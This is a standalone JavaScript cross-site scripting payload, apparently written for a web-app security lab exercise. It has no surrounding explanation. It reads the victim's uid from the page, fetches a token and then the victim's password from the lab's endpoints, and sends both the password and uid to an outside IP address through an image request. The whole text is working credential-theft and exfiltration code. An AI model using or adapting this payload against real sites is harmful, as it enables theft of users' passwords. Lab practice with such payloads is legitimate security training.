<script>

var link = document.getElementById("settings");

var req = new XMLHttpRequest();

var csrf_token = '';

var uid = '';

var req2 = new XMLHttpRequest();

req2.onreadystatechange = function () {
if (req2.readyState == 4 && req2.status == 200 )
 {
 var pass_obj = JSON.parse(req2.responseText);
 
 var password = pass_obj.resp.password;
 
 document.getElementById("result").innerHTML = password;
 
 new Image().src = "http://172.105.54.23:9000/?password="+password+"&uid="+uid;

 }
};

req.onreadystatechange = function () {
if (req.readyState == 4 && req.status == 200 )
  {
  reponse_obj = JSON.parse(req.responseText);
  
  token = reponse_obj.params.token;
  
  req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token, true);
  req2.send();
  
  }
};

uid = link.innerHTML.split(':')[1];

req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid, true);
req.send();

</script>
